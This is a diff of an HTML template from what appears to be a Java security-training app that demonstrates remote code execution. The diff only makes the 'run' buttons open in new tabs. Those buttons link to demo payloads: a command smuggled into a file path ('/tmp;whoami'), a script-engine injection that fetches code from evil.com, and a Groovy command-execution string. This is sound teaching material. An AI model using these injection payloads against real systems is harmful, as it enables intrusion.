@@ -49,7 +49,7 @@
 
             <div class="box-float">
                 <div class="float1">
-                    <a style="float:right" class="btn btn-sm btn-danger"
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
                        th:href="@{/RCE/ProcessBuilder/vul?filepath=/tmp;whoami}">运行</a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - ProcessBuilder方式</span></h5>
 
@@ -66,7 +66,7 @@ public static String cmd(String filepath) {
     ...
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
                        th:href="@{/RCE/Runtime/vul?cmd=id}">运行</a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - Runtime方式</span></h5>
                     <textarea class="form-control" id="code2">
@@ -83,7 +83,7 @@ public static String cmd2(String cmd) {
      ...
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
                        th:href="@{/RCE/ScriptEngine/vul?url=http://evil.com/java/1.js}">运行</a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - 脚本引擎代码注入</span></h5>
                     <textarea class="form-control" id="code3">
@@ -99,7 +99,7 @@ public void jsEngine(String url) throws Exception {
 }
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
                        href="/RCE/Groovy/vul?cmd='open -a Calculator'.execute()">运行</a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - Groovy执行命令</span></h5>
                     <textarea class="form-control" id="code4">
@@ -127,7 +127,7 @@ method.invoke(null, new String[]{cmd}, null, null, null, false);
                 </div>
 
                 <div class="float2">
-                    <a style="float:right" class="btn btn-sm btn-success"
+                    <a style="float:right" class="btn btn-sm btn-success" target="_blank"
                        th:href="@{/RCE/ProcessBuilder/safe?filepath=/tmp;whoami}">运行</a>
                     <h5><span class="lnr lnr-smile"> 安全代码 - 过滤特殊字符</span></h5>
                     <textarea class="form-control" id="code6">
